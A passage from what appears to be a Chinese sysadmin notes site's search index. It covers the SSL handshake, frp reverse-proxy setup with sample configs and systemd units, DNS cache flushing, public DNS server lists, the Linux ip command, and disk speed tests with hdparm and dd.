<p>\u2466\u670d\u52a1\u5668\u548c\u5ba2\u6237\u7aef\u7528\u76f8\u540c\u7684\u4e3b\u5bc6\u7801\u5373\"\u901a\u8bdd\u5bc6\u7801\"\uff0c\u4e00\u4e2a\u5bf9\u79f0\u5bc6\u94a5\u7528\u4e8eSSL\u534f\u8bae\u7684\u5b89\u5168\u6570\u636e\u901a\u8baf\u7684\u52a0\u89e3\u5bc6\u901a\u8baf\u3002\u540c\u65f6\u5728SSL\u901a\u8baf\u8fc7\u7a0b\u4e2d\u8fd8\u8981\u5b8c\u6210\u6570\u636e\u901a\u8baf\u7684\u5b8c\u6574\u6027\uff0c\u9632\u6b62\u6570\u636e\u901a\u8baf\u4e2d\u7684\u4efb\u4f55\u53d8\u5316\u3002 </p> <p>\u2467\u5ba2\u6237\u7aef\u5411\u670d\u52a1\u5668\u7aef\u53d1\u51fa\u4fe1\u606f\uff0c\u6307\u660e\u540e\u9762\u7684\u6570\u636e\u901a\u8baf\u5c06\u4f7f\u7528\u7684\u6b65\u9aa4\u2466\u4e2d\u7684\u4e3b\u5bc6\u7801\u4e3a\u5bf9\u79f0\u5bc6\u94a5\uff0c\u540c\u65f6\u901a\u77e5\u670d\u52a1\u5668\u5ba2\u6237\u7aef\u7684\u63e1\u624b\u8fc7\u7a0b\u7ed3\u675f\u3002 </p> <p>\u2468\u670d\u52a1\u5668\u5411\u5ba2\u6237\u7aef\u53d1\u51fa\u4fe1\u606f\uff0c\u6307\u660e\u540e\u9762\u7684\u6570\u636e\u901a\u8baf\u5c06\u4f7f\u7528\u7684\u6b65\u9aa4\u2466\u4e2d\u7684\u4e3b\u5bc6\u7801\u4e3a\u5bf9\u79f0\u5bc6\u94a5\uff0c\u540c\u65f6\u901a\u77e5\u5ba2\u6237\u7aef\u670d\u52a1\u5668\u7aef\u7684\u63e1\u624b\u8fc7\u7a0b\u7ed3\u675f\u3002 </p> <p>\u2469SSL\u7684\u63e1\u624b\u90e8\u5206\u7ed3\u675f\uff0cSSL\u5b89\u5168\u901a\u9053\u7684\u6570\u636e\u901a\u8baf\u5f00\u59cb\uff0c\u5ba2\u6237\u548c\u670d\u52a1\u5668\u5f00\u59cb\u4f7f\u7528\u76f8\u540c\u7684\u5bf9\u79f0\u5bc6\u94a5\u8fdb\u884c\u6570\u636e\u901a\u8baf\uff0c\u540c\u65f6\u8fdb\u884c\u901a\u8baf\u5b8c\u6574\u6027\u7684\u68c0\u9a8c\u3002 </p> <p>SSL\u5355\u5411\u8ba4\u8bc1\u53ea\u8981\u6c42\u7ad9\u70b9\u90e8\u7f72\u4e86ssl\u8bc1\u4e66\u5c31\u884c\uff0c\u4efb\u4f55\u7528\u6237\u90fd\u53ef\u4ee5\u53bb\u8bbf\u95ee(IP\u88ab\u9650\u5236\u9664\u5916\u7b49)\uff0c\u53ea\u662f\u670d\u52a1\u7aef\u63d0\u4f9b\u4e86\u8eab\u4efd\u8ba4\u8bc1\u3002</p>"},{"location":"daily/15-openssl/#53-sslssl","title":"5.3 SSL\u53cc\u5411\u8ba4\u8bc1\u548cSSL\u5355\u5411\u8ba4\u8bc1\u7684\u533a\u522b","text":"<p>\u53cc\u5411\u8ba4\u8bc1 SSL \u534f\u8bae\u8981\u6c42\u670d\u52a1\u5668\u548c\u7528\u6237\u53cc\u65b9\u90fd\u6709\u8bc1\u4e66\u3002\u5355\u5411\u8ba4\u8bc1 SSL \u534f\u8bae\u4e0d\u9700\u8981\u5ba2\u6237\u62e5\u6709CA\u8bc1\u4e66\uff0c\u5177\u4f53\u7684\u8fc7\u7a0b\u76f8\u5bf9\u4e8e\u4e0a\u9762\u7684\u6b65\u9aa4\uff0c\u53ea\u9700\u5c06\u670d\u52a1\u5668\u7aef\u9a8c\u8bc1\u5ba2\u6237\u8bc1\u4e66\u7684\u8fc7\u7a0b\u53bb\u6389\uff0c\u4ee5\u53ca\u5728\u534f\u5546\u5bf9\u79f0\u5bc6\u7801\u65b9\u6848\uff0c\u5bf9\u79f0\u901a\u8bdd\u5bc6\u94a5\u65f6\uff0c\u670d\u52a1\u5668\u53d1\u9001\u7ed9\u5ba2\u6237\u7684\u662f\u6ca1\u6709\u52a0\u8fc7\u5bc6\u7684(\u8fd9\u5e76\u4e0d\u5f71\u54cd SSL \u8fc7\u7a0b\u7684\u5b89\u5168\u6027)\u5bc6\u7801\u65b9\u6848\u3002\u8fd9\u6837\uff0c\u53cc\u65b9\u5177\u4f53\u7684\u901a\u8baf\u5185\u5bb9\uff0c\u5c31\u662f\u52a0\u8fc7\u5bc6\u7684\u6570\u636e\uff0c\u5982\u679c\u6709\u7b2c\u4e09\u65b9\u653b\u51fb\uff0c\u83b7\u5f97\u7684\u53ea\u662f\u52a0\u5bc6\u7684\u6570\u636e\uff0c\u7b2c\u4e09\u65b9\u8981\u83b7\u5f97\u6709\u7528\u7684\u4fe1\u606f\uff0c\u5c31\u9700\u8981\u5bf9\u52a0\u5bc6\u7684\u6570\u636e\u8fdb\u884c\u89e3\u5bc6\uff0c\u8fd9\u65f6\u5019\u7684\u5b89\u5168\u5c31\u4f9d\u8d56\u4e8e\u5bc6\u7801\u65b9\u6848\u7684\u5b89\u5168\u3002\u800c\u5e78\u8fd0\u7684\u662f\uff0c\u76ee\u524d\u6240\u7528\u7684\u5bc6\u7801\u65b9\u6848\uff0c\u53ea\u8981\u901a\u8baf\u5bc6\u94a5\u957f\u5ea6\u8db3\u591f\u7684\u957f\uff0c\u5c31\u8db3\u591f\u7684\u5b89\u5168\u3002\u8fd9\u4e5f\u662f\u6211\u4eec\u5f3a\u8c03\u8981\u6c42\u4f7f\u7528128\u4f4d\u52a0\u5bc6\u901a\u8baf\u7684\u539f\u56e0\u3002 </p> <p>\u4e00\u822cWeb\u5e94\u7528\u90fd\u662f\u91c7\u7528SSL\u5355\u5411\u8ba4\u8bc1\u7684\uff0c\u539f\u56e0\u5f88\u7b80\u5355\uff0c\u7528\u6237\u6570\u76ee\u5e7f\u6cdb\uff0c\u4e14\u65e0\u9700\u5728\u901a\u8baf\u5c42\u5bf9\u7528\u6237\u8eab\u4efd\u8fdb\u884c\u9a8c\u8bc1\uff0c\u4e00\u822c\u90fd\u5728\u5e94\u7528\u903b\u8f91\u5c42\u6765\u4fdd\u8bc1\u7528\u6237\u7684\u5408\u6cd5\u767b\u5165\u3002\u4f46\u5982\u679c\u662f\u4f01\u4e1a\u5e94\u7528\u5bf9\u63a5\uff0c\u60c5\u51b5\u5c31\u4e0d\u4e00\u6837\uff0c\u53ef\u80fd\u4f1a\u8981\u6c42\u5bf9\u5ba2\u6237\u7aef(\u76f8\u5bf9\u800c\u8a00)\u505a\u8eab\u4efd\u9a8c\u8bc1\u3002\u8fd9\u65f6\u5c31\u9700\u8981\u505aSSL\u53cc\u5411\u8ba4\u8bc1\u3002 </p>"},{"location":"daily/16-network/","title":"\u7f51\u7edc\u4fe1\u606f","text":""},{"location":"daily/16-network/#ip","title":"\u4e00\u3001IP\u5e93","text":"\u540d\u79f0 \u5730\u5740 ip https://ip.cn/ taobao http://ip.taobao.com/ 123cha http://www.123cha.com/ ipip https://www.ipip.net/ \u7eaf\u771fcz88 http://www.cz88.net/ ip138 http://www.ip138.com/"},{"location":"daily/16-network/#proxy","title":"\u4e8c\u3001Proxy","text":""},{"location":"daily/16-network/#21-goproxy","title":"2.1 goproxy","text":"<p>Reference</p>"},{"location":"daily/16-network/#22-frp","title":"2.2 frp","text":"<p>\u4ee3\u7406\u65b9\u5f0f\u4e30\u5bcc\uff0c\u652f\u6301http\u3001sockes\u7b49\u7b49\u3002</p> <pre><code># \u4f7f\u7528\u6548\u679c\u4e00\u89c8\ncurl --proxy \"http://abc:abc@u.8ops.top:56001\"   \"https://ip.8ops.top\"\ncurl --proxy \"socks5://abc:abc@u.8ops.top:56005\" \"https://ip.8ops.top\"\n</code></pre> <p>Reference</p>"},{"location":"daily/16-network/#221-download","title":"2.2.1 Download","text":"<pre><code>cd /usr/local\nFRP_VERSION=0.58.1\nwget  https://github.com/fatedier/frp/releases/download/v${FRP_VERSION}/frp_${FRP_VERSION}_linux_amd64.tar.gz\ntar xzf frp_${FRP_VERSION}_linux_amd64.tar.gz \nln -s frp_${FRP_VERSION}_linux_amd64 frp\n</code></pre>"},{"location":"daily/16-network/#222-server","title":"2.2.2 Server","text":"<p>frps.ini</p> <p>Deprecated</p> <pre><code># config frps.ini\ndashboard_user = admin\ndashboard_pwd = \ntoken = \nallow_ports = 50000-51000,56000-57000\nsubdomain_host = 8ops.top\n\n# vhost_http_port = 80\n# vhost_https_port = 443\n\n#[plugin.user-manager]\n#addr = 127.0.0.1:9000\n#path = /handler\n#ops = Login\n#\n#[plugin.port-manager]\n#addr = 127.0.0.1:9001\n#path = /handler\n#ops = NewProxy\n</code></pre> <p>frps.toml</p> <p>Reference</p> <pre><code># frps.toml\nbindPort = 7000\n\nwebServer.addr = \"127.0.0.1\"\nwebServer.port = 7500\nwebServer.user = \"admin\"\nwebServer.password = \"admin\"\n\nlog.to = \"/var/log/frps.log\"\nlog.level = \"info\"\nlog.maxDays = 3\n\n[[httpPlugins]]\nname = \"user-manager\"\naddr = \"127.0.0.1:9000\"\npath = \"/handler\"\nops = [\"Login\"]\n\n[[httpPlugins]]\nname = \"port-manager\"\naddr = \"127.0.0.1:9001\"\npath = \"/handler\"\nops = [\"NewProxy\"]\n</code></pre> <p>service</p> <pre><code># service\ncat &gt; /usr/lib/systemd/system/frps.service &lt;&lt;EOF\n[Unit]\nDescription=Frp Server Service\nAfter=network.target\n\n[Service]\nType=simple\nWorkingDirectory=/usr/local/frp\nUser=nobody\nRestart=on-failure\nRestartSec=5s\nExecStart=/usr/local/frp/frps -c frps.ini\n\n[Install]\nWantedBy=multi-user.target\nEOF\n\nsystemctl daemon-reload\nsystemctl start frps\nsystemctl enable frps\nsystemctl is-enabled frps\nsystemctl status frps\n</code></pre>"},{"location":"daily/16-network/#223-client","title":"2.2.3 Client","text":"<p>frpc.ini</p> <p>Deprecated</p> <pre><code># config frpc.ini\n[common]\nserver_addr = xx.8ops.top\nserver_port = 7000\ntoken = \n\n[proxy-ssh-xx]\ntype = tcp\nlocal_ip = 127.0.0.1\nlocal_port = 22\nremote_port = xx\n\n[proxy-https-xx]\ntype = tcp\nlocal_ip = 127.0.0.1\nlocal_port = 443\nremote_port = xx\n\n[proxy-http-xx]\ntype = tcp\nlocal_ip = 127.0.0.1\nlocal_port = 80\nremote_port = xx\n\n[proxy-http-xx]\ntype = tcp\nremote_port = xx\nplugin = http_proxy\nplugin_http_user = xx\nplugin_http_passwd = xx\n\n[proxy-socks5-xx]\ntype = tcp\nremote_port = xx\nplugin = socks5\nplugin_user = xx\nplugin_passwd = xx\n</code></pre> <p>frpc.toml</p> <p>Reference</p> <pre><code># frpc.toml\nserverAddr = \"127.0.0.1\"\nserverPort = 7000\n\n[[proxies]]\nname = \"http_proxy\"\ntype = \"tcp\"\nremotePort = 6000\n\n[proxies.plugin]\ntype = \"http_proxy\"\nhttpUser = \"abc\"\nhttpPassword = \"abc\"\n</code></pre> <p>service</p> <pre><code># /usr/local/frp/frpc tcp -n demo -t token -p tcp -s frps.8ops.top:7000 -r 56666 -i 127.0.0.1 -l 12622\n\n# service\ncat &gt; /usr/lib/systemd/system/frpc.service &lt;&lt;EOF\n[Unit]\nDescription=Frp Client Service\nAfter=network.target\n\n[Service]\nType=simple\nWorkingDirectory=/usr/local/frp\nUser=nobody\nRestart=on-failure\nRestartSec=5s\nExecStart=/usr/local/frp/frpc -c frpc.ini\n\n[Install]\nWantedBy=multi-user.target\nEOF\n\nsystemctl daemon-reload\nsystemctl start frpc\nsystemctl enable frpc\nsystemctl is-enabled frpc\nsystemctl status frpc\n</code></pre>"},{"location":"daily/16-network/#hosts","title":"\u4e09\u3001hosts","text":"<p>\u4fee\u6539hosts\u540e\u91ca\u653edns\u6c61\u67d3\uff1a</p>"},{"location":"daily/16-network/#31-windows","title":"3.1 Windows","text":"<pre><code>\u5f00\u59cb -&gt; \u8fd0\u884c -&gt; \u8f93\u5165cmd -&gt; \u5728CMD\u7a97\u53e3\u8f93\u5165\nipconfig /flushdns\n</code></pre>"},{"location":"daily/16-network/#32-linux","title":"3.2 Linux","text":"<p>\u7ec8\u7aef\u8f93\u5165</p> <pre><code>sudo rcnscd restart\n</code></pre> <p>\u5bf9\u4e8esystemd\u53d1\u884c\u7248\uff0c\u8bf7\u4f7f\u7528\u547d\u4ee4</p> <pre><code>sudo systemctl restart NetworkManager\n</code></pre> <p>\u5982\u679c\u4e0d\u61c2\u8bf7\u90fd\u5c1d\u8bd5\u4e0b</p>"},{"location":"daily/16-network/#33-mac","title":"3.3 MAC","text":"<p>Mac OSX \u7ec8\u7aef\u8f93\u5165</p> <pre><code>sudo killall -HUP mDNSResponder\n</code></pre>"},{"location":"daily/16-network/#34-android","title":"3.4 Android","text":"<pre><code>\u5f00\u542f\u98de\u884c\u6a21\u5f0f -&gt; \u5173\u95ed\u98de\u884c\u6a21\u5f0f\n</code></pre> <p>\u901a\u7528\u65b9\u6cd5</p> <pre><code>\u62d4\u7f51\u7ebf(\u65ad\u7f51) -&gt; \u63d2\u7f51\u7ebf(\u91cd\u65b0\u8fde\u63a5\u7f51\u7edc)\n</code></pre>"},{"location":"daily/16-network/#dns","title":"\u56db\u3001\u5e38\u7528DNS","text":""},{"location":"daily/16-network/#41","title":"4.1 \u516c\u5171","text":"\u540d\u79f0 \u5730\u5740\u4e00 \u5730\u5740\u4e8c 114 DNS 114.114.114.114 114.114.115.115 \u963f\u91cc AliDNS 223.5.5.5 223.6.6.6 \u767e\u5ea6 BaiduDNS 180.76.76.76 DNSPod DNS+ 119.29.29.29 182.254.116.116 CNNIC SDNS 1.2.4.8 210.2.4.8 oneDNS 117.50.11.11 52.80.66.66 DNS \u6d3e \u7535\u4fe1/\u79fb\u52a8/\u94c1\u901a 101.226.4.6 218.30.118.6 DNS \u6d3e \u8054\u901a 123.125.81.6 140.207.198.6 Google DNS 8.8.8.8 8.8.4.4 IBM Quad9 9.9.9.9 OpenDNS 208.67.222.222 208.67.220.220 V2EX DNS 199.91.73.222 178.79.131.110"},{"location":"daily/16-network/#42","title":"4.2 \u5404\u5730\u7535\u4fe1","text":"\u540d\u79f0 \u5730\u5740\u4e00 \u5730\u5740\u4e8c \u5b89\u5fbd\u7535\u4fe1 DNS 61.132.163.68 202.102.213.68 \u5317\u4eac\u7535\u4fe1 DNS 219.141.136.10 219.141.140.10 \u91cd\u5e86\u7535\u4fe1 DNS 61.128.192.68 61.128.128.68 \u798f\u5efa\u7535\u4fe1 DNS 218.85.152.99 218.85.157.99 \u7518\u8083\u7535\u4fe1 DNS 202.100.64.68 61.178.0.93 \u5e7f\u4e1c\u7535\u4fe1 DNS 202.96.128.86 202.96.128.166 202.96.134.33 202.96.128.68 \u5e7f\u897f\u7535\u4fe1 DNS 202.103.225.68 202.103.224.68 \u8d35\u5dde\u7535\u4fe1 DNS 202.98.192.67 202.98.198.167 \u6cb3\u5357\u7535\u4fe1 DNS 222.88.88.88 222.85.85.85 \u9ed1\u9f99\u6c5f\u7535\u4fe1 219.147.198.230 219.147.198.242 \u6e56\u5317\u7535\u4fe1 DNS 202.103.24.68 202.103.0.68 \u6e56\u5357\u7535\u4fe1 DNS 222.246.129.80 59.51.78.211 \u6c5f\u82cf\u7535\u4fe1 DNS 218.2.2.2 218.4.4.4 61.147.37.1 218.2.135.1 \u6c5f\u897f\u7535\u4fe1 DNS 202.101.224.69 202.101.226.68 \u5185\u8499\u53e4\u7535\u4fe1 219.148.162.31 222.74.39.50 \u5c71\u4e1c\u7535\u4fe1 DNS 219.146.1.66 219.147.1.66 \u9655\u897f\u7535\u4fe1 DNS 218.30.19.40 61.134.1.4 \u4e0a\u6d77\u7535\u4fe1 DNS 202.96.209.133 116.228.111.118 202.96.209.5 108.168.255.118 \u56db\u5ddd\u7535\u4fe1 DNS 61.139.2.69 218.6.200.139 \u5929\u6d25\u7535\u4fe1 DNS 219.150.32.132 219.146.0.132 \u4e91\u5357\u7535\u4fe1 DNS 222.172.200.68 61.166.150.123 \u6d59\u6c5f\u7535\u4fe1 DNS 202.101.172.35 61.153.177.196 61.153.81.75 60.191.244.5"},{"location":"daily/16-network/#43","title":"4.3 \u5404\u5730\u8054\u901a","text":"\u540d\u79f0 \u5730\u5740\u4e00 \u5730\u5740\u4e8c \u5317\u4eac\u8054\u901a DNS 123.123.123.123 123.123.123.124 202.106.0.20 202.106.195.68 \u91cd\u5e86\u8054\u901a DNS 221.5.203.98 221.7.92.98 \u5e7f\u4e1c\u8054\u901a DNS 210.21.196.6 221.5.88.88 \u6cb3\u5317\u8054\u901a DNS 202.99.160.68 202.99.166.4 \u6cb3\u5357\u8054\u901a DNS 202.102.224.68 202.102.227.68 \u9ed1\u9f99\u6c5f\u8054\u901a 202.97.224.69 202.97.224.68 \u5409\u6797\u8054\u901a DNS 202.98.0.68 202.98.5.68 \u6c5f\u82cf\u8054\u901a DNS 221.6.4.66 221.6.4.67 \u5185\u8499\u53e4\u8054\u901a 202.99.224.68 202.99.224.8 \u5c71\u4e1c\u8054\u901a DNS 202.102.128.68 202.102.152.3 202.102.134.68 202.102.154.3 \u5c71\u897f\u8054\u901a DNS 202.99.192.66 202.99.192.68 \u9655\u897f\u8054\u901a DNS 221.11.1.67 221.11.1.68 \u4e0a\u6d77\u8054\u901a DNS 210.22.70.3 210.22.84.3 \u56db\u5ddd\u8054\u901a DNS 119.6.6.6 124.161.87.155 \u5929\u6d25\u8054\u901a DNS 202.99.104.68 202.99.96.68 \u6d59\u6c5f\u8054\u901a DNS 221.12.1.227 221.12.33.227 \u8fbd\u5b81\u8054\u901a DNS 202.96.69.38 202.96.64.68"},{"location":"daily/16-network/#44","title":"4.4 \u5404\u5730\u79fb\u52a8","text":"\u540d\u79f0 \u5730\u5740\u4e00 \u5730\u5740\u4e8c \u6c5f\u82cf\u79fb\u52a8 DNS 221.131.143.69 112.4.0.55 \u5b89\u5fbd\u79fb\u52a8 DNS 211.138.180.2 211.138.180.3 \u5c71\u4e1c\u79fb\u52a8 DNS 218.201.96.130 211.137.191.26"},{"location":"daily/16-network/#_2","title":"\u4e94 \u7f51\u5361\u914d\u7f6e","text":"<p>\u7f51\u7edc\u914d\u7f6e\u5de5\u5177</p> <p>ip\u547d\u4ee4 \u7528\u6765\u663e\u793a\u6216\u64cd\u7eb5Linux\u4e3b\u673a\u7684\u8def\u7531\u3001\u7f51\u7edc\u8bbe\u5907\u3001\u7b56\u7565\u8def\u7531\u548c\u96a7\u9053\uff0c\u662fLinux\u4e0b\u8f83\u65b0\u7684\u529f\u80fd\u5f3a\u5927\u7684\u7f51\u7edc\u914d\u7f6e\u5de5\u5177\u3002</p> <p>\u8bed\u6cd5</p> <pre><code>ip(\u9009\u9879)(\u5bf9\u8c61)\nUsage: ip [ OPTIONS ] OBJECT { COMMAND | help }\n       ip [ -force ] -batch filename\n</code></pre>"},{"location":"daily/16-network/#51","title":"5.1 \u5bf9\u8c61","text":"<pre><code>OBJECT := { link | address | addrlabel | route | rule | neigh | ntable |\n       tunnel | tuntap | maddress | mroute | mrule | monitor | xfrm |\n       netns | l2tp | macsec | tcp_metrics | token }\n\n-V\uff1a\u663e\u793a\u6307\u4ee4\u7248\u672c\u4fe1\u606f\uff1b\n-s\uff1a\u8f93\u51fa\u66f4\u8be6\u7ec6\u7684\u4fe1\u606f\uff1b\n-f\uff1a\u5f3a\u5236\u4f7f\u7528\u6307\u5b9a\u7684\u534f\u8bae\u65cf\uff1b\n-4\uff1a\u6307\u5b9a\u4f7f\u7528\u7684\u7f51\u7edc\u5c42\u534f\u8bae\u662fIPv4\u534f\u8bae\uff1b\n-6\uff1a\u6307\u5b9a\u4f7f\u7528\u7684\u7f51\u7edc\u5c42\u534f\u8bae\u662fIPv6\u534f\u8bae\uff1b\n-0\uff1a\u8f93\u51fa\u4fe1\u606f\u6bcf\u6761\u8bb0\u5f55\u8f93\u51fa\u4e00\u884c\uff0c\u5373\u4f7f\u5185\u5bb9\u8f83\u591a\u4e5f\u4e0d\u6362\u884c\u663e\u793a\uff1b\n-r\uff1a\u663e\u793a\u4e3b\u673a\u65f6\uff0c\u4e0d\u4f7f\u7528IP\u5730\u5740\uff0c\u800c\u4f7f\u7528\u4e3b\u673a\u7684\u57df\u540d\u3002\n</code></pre>"},{"location":"daily/16-network/#52","title":"5.2 \u9009\u9879","text":"<pre><code>OPTIONS := { -V[ersion] | -s[tatistics] | -d[etails] | -r[esolve] |\n        -h[uman-readable] | -iec |\n        -f[amily] { inet | inet6 | ipx | dnet | bridge | link } |\n        -4 | -6 | -I | -D | -B | -0 |\n        -l[oops] { maximum-addr-flush-attempts } |\n        -o[neline] | -t[imestamp] | -ts[hort] | -b[atch] [filename] |\n        -rc[vbuf] [size] | -n[etns] name | -a[ll] }\n\n\u7f51\u7edc\u5bf9\u8c61\uff1a\u6307\u5b9a\u8981\u7ba1\u7406\u7684\u7f51\u7edc\u5bf9\u8c61\uff1b\n\u5177\u4f53\u64cd\u4f5c\uff1a\u5bf9\u6307\u5b9a\u7684\u7f51\u7edc\u5bf9\u8c61\u5b8c\u6210\u5177\u4f53\u64cd\u4f5c\uff1b\nhelp\uff1a\u663e\u793a\u7f51\u7edc\u5bf9\u8c61\u652f\u6301\u7684\u64cd\u4f5c\u547d\u4ee4\u7684\u5e2e\u52a9\u4fe1\u606f\u3002\n</code></pre>"},{"location":"daily/16-network/#53","title":"5.3 \u5b9e\u4f8b","text":"<pre><code>ip link show                    # \u663e\u793a\u7f51\u7edc\u63a5\u53e3\u4fe1\u606f\nip link set eth0 up             # \u5f00\u542f\u7f51\u5361\nip link set eth0 down            # \u5173\u95ed\u7f51\u5361\nip link set eth0 promisc on      # \u5f00\u542f\u7f51\u5361\u7684\u6df7\u5408\u6a21\u5f0f\nip link set eth0 promisc offi    # \u5173\u95ed\u7f51\u5361\u7684\u6df7\u5408\u6a21\u5f0f\nip link set eth0 txqueuelen 1200 # \u8bbe\u7f6e\u7f51\u5361\u961f\u5217\u957f\u5ea6\nip link set eth0 mtu 1400        # \u8bbe\u7f6e\u7f51\u5361\u6700\u5927\u4f20\u8f93\u5355\u5143\nip addr show     # \u663e\u793a\u7f51\u5361IP\u4fe1\u606f\nip addr add 192.168.0.1/24 dev eth0 # \u4e3aeth0\u7f51\u5361\u6dfb\u52a0\u4e00\u4e2a\u65b0\u7684IP\u5730\u5740192.168.0.1\nip addr del 192.168.0.1/24 dev eth0 # \u4e3aeth0\u7f51\u5361\u5220\u9664\u4e00\u4e2aIP\u5730\u5740192.168.0.1\n\nip route show # \u663e\u793a\u7cfb\u7edf\u8def\u7531\nip route add default via 192.168.1.254   # \u8bbe\u7f6e\u7cfb\u7edf\u9ed8\u8ba4\u8def\u7531\nip route list                 # \u67e5\u770b\u8def\u7531\u4fe1\u606f\nip route add 192.168.4.0/24  via  192.168.0.254 dev eth0 # \u8bbe\u7f6e192.168.4.0\u7f51\u6bb5\u7684\u7f51\u5173\u4e3a192.168.0.254,\u6570\u636e\u8d70eth0\u63a5\u53e3\nip route add default via  192.168.0.254  dev eth0        # \u8bbe\u7f6e\u9ed8\u8ba4\u7f51\u5173\u4e3a192.168.0.254\nip route del 192.168.4.0/24   # \u5220\u9664192.168.4.0\u7f51\u6bb5\u7684\u7f51\u5173\nip route del default          # \u5220\u9664\u9ed8\u8ba4\u8def\u7531\nip route delete 192.168.1.0/24 dev eth0 # \u5220\u9664\u8def\u7531\n</code></pre> <p>\u7528ip\u547d\u4ee4\u663e\u793a\u7f51\u7edc\u8bbe\u5907\u7684\u8fd0\u884c\u72b6\u6001</p> <pre><code>[root@localhost ~]# ip link list\n1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 16436 qdisc noqueue\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast qlen 1000\n    link/ether 00:16:3e:00:1e:51 brd ff:ff:ff:ff:ff:ff\n3: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast qlen 1000\n    link/ether 00:16:3e:00:1e:52 brd ff:ff:ff:ff:ff:ff\n</code></pre> <p>\u663e\u793a\u66f4\u52a0\u8be6\u7ec6\u7684\u8bbe\u5907\u4fe1\u606f</p> <pre><code>[root@localhost ~]# ip -s link list\n1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 16436 qdisc noqueue\n    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n    RX: bytes  packets  errors  dropped overrun mcast   \n    5082831    56145    0       0       0       0      \n    TX: bytes  packets  errors  dropped carrier collsns\n    5082831    56145    0       0       0       0      \n2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast qlen 1000\n    link/ether 00:16:3e:00:1e:51 brd ff:ff:ff:ff:ff:ff\n    RX: bytes  packets  errors  dropped overrun mcast   \n    3641655380 62027099 0       0       0       0      \n    TX: bytes  packets  errors  dropped carrier collsns\n    6155236    89160    0       0       0       0      \n3: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast qlen 1000\n    link/ether 00:16:3e:00:1e:52 brd ff:ff:ff:ff:ff:ff\n    RX: bytes  packets  errors  dropped overrun mcast   \n    2562136822 488237847 0       0       0       0      \n    TX: bytes  packets  errors  dropped carrier collsns\n    3486617396 9691081  0       0       0       0     \n</code></pre> <p>\u663e\u793a\u6838\u5fc3\u8def\u7531\u8868</p> <pre><code>[root@localhost ~]# ip route list \n112.124.12.0/22 dev eth1  proto kernel  scope link  src 112.124.15.130\n10.160.0.0/20 dev eth0  proto kernel  scope link  src 10.160.7.81\n192.168.0.0/16 via 10.160.15.247 dev eth0\n172.16.0.0/12 via 10.160.15.247 dev eth0\n10.0.0.0/8 via 10.160.15.247 dev eth0\ndefault via 112.124.15.247 dev eth1\n</code></pre> <p>\u663e\u793a\u90bb\u5c45\u8868</p> <pre><code>[root@localhost ~]# ip neigh list\n112.124.15.247 dev eth1 lladdr 00:00:0c:9f:f3:88 REACHABLE\n10.160.15.247 dev eth0 lladdr 00:00:0c:9f:f2:c0 STALE\n</code></pre> <p>\u83b7\u53d6\u4e3b\u673a\u6240\u6709\u7f51\u7edc\u63a5\u53e3</p> <pre><code>ip link | grep -E '^[0-9]' | awk -F: '{print $2}'\n</code></pre>"},{"location":"daily/17-io/","title":"io","text":""},{"location":"daily/17-io/#hdparm","title":"\u4e00\u3001hdparm \u547d\u4ee4","text":"<p>hdparm \u547d\u4ee4\u63d0\u4f9b\u4e86\u4e00\u4e2a\u547d\u4ee4\u884c\u7684\u63a5\u53e3\u7528\u4e8e\u8bfb\u53d6\u548c\u8bbe\u7f6eIDE\u6216SCSI\u786c\u76d8\u53c2\u6570\uff0c\u6ce8\u610f\u8be5\u547d\u4ee4**\u53ea\u80fd\u6d4b\u8bd5\u78c1\u76d8\u7684\u8bfb\u53d6**\u901f\u7387\u3002</p> <p>\u4f8b\u5982\uff0c\u6d4b\u8bd5 sda \u78c1\u76d8\u7684\u8bfb\u53d6\u901f\u7387\uff1a</p> <pre><code>[root@server-68.2.stage.polex.io var ]$ hdparm -Tt /dev/polex_pv/varvol\n\n/dev/polex_pv/varvol:\n Timing cached reads:   15588 MB in  2.00 seconds = 7803.05 MB/sec\n Timing buffered disk reads: 1128 MB in  3.01 seconds = 374.90 MB/sec\n</code></pre> <p>\u4ece\u6d4b\u8bd5\u7ed3\u679c\u770b\u51fa\uff0c\u5e26\u6709\u7f13\u5b58\u7684\u8bfb\u53d6\u901f\u7387\u4e3a\uff1a7803.05MB/s \uff0c\u78c1\u76d8\u7684\u5b9e\u9645\u8bfb\u53d6\u901f\u7387\u4e3a\uff1a374.90 MB/s \u3002</p>"},{"location":"daily/17-io/#dd","title":"\u4e8c\u3001dd \u547d\u4ee4","text":"<p>Linux dd \u547d\u4ee4\u7528\u4e8e\u8bfb\u53d6\u3001\u8f6c\u6362\u5e76\u8f93\u51fa\u6570\u636e\u3002dd \u53ef\u4ece\u6807\u51c6\u8f93\u5165\u6216\u6587\u4ef6\u4e2d\u8bfb\u53d6\u6570\u636e\uff0c\u6839\u636e\u6307\u5b9a\u7684\u683c\u5f0f\u6765\u8f6c\u6362\u6570\u636e\uff0c\u518d\u8f93\u51fa\u5230\u6587\u4ef6\u3001\u8bbe\u5907\u6216\u6807\u51c6\u8f93\u51fa\u3002</p> <p>\u6211\u4eec\u53ef\u4ee5\u5229\u7528 dd \u547d\u4ee4\u7684\u590d\u5236\u529f\u80fd\uff0c\u6d4b\u8bd5\u67d0\u4e2a\u78c1\u76d8\u7684 IO \u6027\u80fd\uff0c\u987b\u8981\u6ce8\u610f\u7684\u662f dd \u547d\u4ee4\u53ea\u80fd\u5927\u81f4\u6d4b\u51fa\u78c1\u76d8\u7684 IO \u6027\u80fd\uff0c\u4e0d\u662f\u975e\u5e38\u51c6\u786e\u3002</p> <p>\u6d4b\u8bd5\u5199\u6027\u80fd\u547d\u4ee4\uff1a</p> <pre><code>[root@server-68.2.stage.polex.io var ]$ time dd if=/dev/zero of=test.file bs=1G count=2 oflag=direct\n2+0 records in\n2+0 records out\n2147483648 bytes (2.1 GB) copied, 13.5487 s, 159 MB/s\n\nreal    0m13.556s\nuser    0m0.000s\nsys    0m0.888s \n</code></pre> <p>\u53ef\u4ee5\u770b\u5230\uff0c\u8be5\u5206\u533a\u78c1\u76d8\u5199\u5165\u901f\u7387\u4e3a 159M/s\uff0c\u5176\u4e2d\uff1a</p> 